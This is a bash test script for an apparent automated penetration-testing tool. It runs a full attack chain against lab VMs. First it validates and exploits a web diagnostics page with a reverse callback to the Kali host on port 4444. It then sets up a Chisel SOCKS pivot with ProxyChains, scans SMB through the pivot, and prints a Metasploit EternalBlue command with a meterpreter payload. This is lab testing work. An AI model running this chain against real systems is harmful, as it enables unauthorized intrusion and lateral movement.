#!/usr/bin/env bash

set -u

# Always run relative to the project directory.
cd "$(dirname "$0")" || exit 1

UBUNTU_IP="${1:-}"
WIN10_IP="${2:-}"

if [[ -z "$UBUNTU_IP" || -z "$WIN10_IP" ]]; then
    echo "Usage: $0 <ubuntu-ip> <windows-ip>"
    echo "Example: $0 192.168.67.129 192.168.67.132"
    exit 1
fi

# Find the Kali address actually used to reach Ubuntu.
KALI_IP="$(
    ip route get "$UBUNTU_IP" 2>/dev/null |
    awk '{
        for (i = 1; i <= NF; i++) {
            if ($i == "src") {
                print $(i + 1)
                exit
            }
        }
    }'
)"

echo "=== AutoPenTest Full Chain Test ==="
echo "Kali:   ${KALI_IP:-NOT DETECTED}"
echo "Ubuntu: $UBUNTU_IP"
echo "Win10:  $WIN10_IP"
echo

if [[ -z "$KALI_IP" ]]; then
    echo "❌ Kali has no route to Ubuntu at $UBUNTU_IP"
    echo
    ip -br -4 addr
    echo
    ip route
    exit 1
fi

export KALI_IP
export UBUNTU_IP
export WIN10_IP



# ------------------------------------------------------------
# 0. Connectivity preflight
# ------------------------------------------------------------

echo "[0/5] Connectivity preflight..."

if timeout 5 bash -c "</dev/tcp/$UBUNTU_IP/80" 2>/dev/null; then
    echo "  ✅ Ubuntu port 80 is reachable"
else
    echo "  ❌ Cannot reach $UBUNTU_IP:80"
    exit 1
fi

echo

# ------------------------------------------------------------
# 1. Web validation
# ------------------------------------------------------------

echo "[1/5] Web validation..."

python3 <<'PY'
import json
import os

from exploitation.web_validator import WebValidationService

ubuntu_ip = os.environ["UBUNTU_IP"]

wv = WebValidationService(
    enabled=True,
    timeout=5,
    max_response_bytes=65536,
    max_redirects=2,
    operating_system="linux",
)

# Include several commonly used field names so the output is easier
# to compare against the application's real scanner format.
scan_data = {
    "target_ip": ubuntu_ip,
    "service_inventory": [
        {
            "host": ubuntu_ip,
            "port": 80,
            "protocol": "tcp",
            "state": "open",
            "service": "http",
        }
    ],
    "web_inventory": [
        {
            "host": ubuntu_ip,
            "port": 80,
            "url": f"http://{ubuntu_ip}:80/diagnostics.php",
            "path": "/diagnostics.php",
        }
    ],
}

try:
    result = wv.propose_actions(
        scan_data,
        allow_follow_up=True,
    )
except Exception as exc:
    print(f"  ❌ Validation exception: {type(exc).__name__}: {exc}")
    raise SystemExit(0)

print("  Validator result:")
print(json.dumps(result, indent=2, default=str))

actions = result.get("actions") or []

if not actions:
    print("  ❌ No actions proposed")
    print("  Check the collection_events and diagnostics fingerprint.")
    raise SystemExit(0)

action = actions[0]
action_id = action.get("action_id") or action.get("id")

try:
    run_result = wv.run_action(
        action_id=action_id,
        parsed_results=scan_data,
        approved=True,
    )
except Exception as exc:
    print(f"  ❌ Action exception: {type(exc).__name__}: {exc}")
    raise SystemExit(0)

print("  Action result:")
print(json.dumps(run_result, indent=2, default=str))

status = run_result.get("status")
print(f'  Confirmed: {"✅" if status == "confirmed" else "❌"}')
PY

echo
# ------------------------------------------------------------
# 2. Web exploitation
# ------------------------------------------------------------

echo "[2/5] Web exploitation..."

python3 <<'PY'
import json
import os
import urllib.error
import urllib.request

from exploitation.web_exploiter import WebExploiter

kali_ip = os.environ["KALI_IP"]
ubuntu_ip = os.environ["UBUNTU_IP"]

base_url = f"http://{ubuntu_ip}:80/diagnostics.php"

try:
    with urllib.request.urlopen(base_url, timeout=5) as response:
        status = response.status
        body = response.read(131072)
except urllib.error.HTTPError as exc:
    print(f"  ❌ Initial HTTP request returned {exc.code}: {exc.reason}")
    raise SystemExit(0)
except Exception as exc:
    print(f"  ❌ Initial HTTP request failed: {exc}")
    raise SystemExit(0)

print(f"  Diagnostics endpoint status: {status}")

if b"AutoPentest Lab Diagnostics" not in body:
    print("  ⏸ Validation blocked: the expected diagnostics page was not found.")
    print("  Install lab_target/diagnostics.php on the Ubuntu target first.")
    raise SystemExit(0)

we = WebExploiter(
    lhost=kali_ip,
    lport=4444,
)

try:
    result = we.exploit(
        target_ip=ubuntu_ip,
        port=80,
        platform="linux",
    )
except Exception as exc:
    print(f"  ❌ Exploiter exception: {type(exc).name}: {exc}")
    raise SystemExit(0)

print("  Exploiter result:")
print(json.dumps(result, indent=2, default=str))

verified = result.get("marker_verified") is True
error = result.get("error") or ""

print(
    f'  Verified callback: '
    f'{"✅" if verified else "❌"} '
    f'{error}'
)
PY

echo

# ------------------------------------------------------------
# 3. Pivot setup
# ------------------------------------------------------------

echo "[3/5] Pivot setup..."

python3 <<'PY'
import os
import socket

from pivot.pivot_engine import PivotEngine

kali_ip = os.environ["KALI_IP"]

pe = PivotEngine(kali_ip=kali_ip)

def port_open(host: str, port: int) -> bool:
    try:
        with socket.create_connection((host, port), timeout=1):
            return True
    except OSError:
        return False

already_running = port_open("127.0.0.1", 8080)

if already_running:
    print("  Chisel server already listening on port 8080")
    ok = True
else:
    ok = pe.start_chisel_server(
        port=8080,
        socks_port=1080,
    )

print(f'  Chisel: {"✅" if ok else "❌"}')

if not ok:
    raise SystemExit(0)

try:
    proxychains_ok = pe.configure_proxychains(
        socks_port=1080,
    )
except Exception as exc:
    print(f"  ❌ ProxyChains configuration failed: {exc}")
    proxychains_ok = False

print(
    f'  ProxyChains config: {"✅" if proxychains_ok else "❌"}'
)

client_command = pe.generate_client_command(
    platform="linux",
    chisel_port=8080,
)

print("  Ubuntu client command:")
print(f"  {client_command}")
PY

echo
# ------------------------------------------------------------
# 4. Internal scan
# ------------------------------------------------------------

echo "[4/5] Internal scan..."

SOCKS_ACTIVE="$(
    ss -lnt 2>/dev/null |
    awk '{print $4}' |
    grep -Ec '(^|:)1080$' || true
)"

if [[ "$SOCKS_ACTIVE" -gt 0 ]]; then
    echo "  ✅ SOCKS proxy detected on port 1080"
    echo "  Running internal SMB scan through Ubuntu..."

    proxychains4 \
        -q \
        -f "$PWD/proxychains4.conf" \
        nmap \
        -sT \
        -Pn \
        -p445 \
        "$WIN10_IP"
else
    echo "  ⏳ SOCKS port 1080 is not active yet."
    echo "  Run the generated Chisel client command on Ubuntu, then use:"
    echo
    echo "  proxychains4 -f $PWD/proxychains4.conf nmap -sT -Pn -p445 $WIN10_IP"
fi

echo

# ------------------------------------------------------------
# 5. Lateral movement command
# ------------------------------------------------------------

echo "[5/5] Lateral movement command generated:"

echo "  proxychains4 -f $PWD/proxychains4.conf msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $WIN10_IP; set PAYLOAD windows/x64/meterpreter/bind_tcp; exploit -z'"

echo
echo "=== Done ==="
